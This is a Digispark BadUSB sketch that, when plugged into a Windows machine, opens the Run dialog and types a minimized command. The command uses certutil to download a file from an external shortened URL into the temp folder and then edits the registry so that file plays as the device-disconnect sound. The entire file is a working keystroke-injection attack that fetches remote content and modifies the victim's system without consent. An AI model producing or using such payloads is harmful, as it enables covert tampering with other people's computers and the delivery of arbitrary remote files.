#include "DigiKeyboard.h"
void setup() { //execute once
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /C start /MIN cmd /C powershell certutil -urlcache -split -f 'http://bit.do/loud0' $env:temp/s.wav;reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\DeviceDisconnect\\.Current\\ /t REG_SZ /d  $env:temp/s.wav /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {

  }
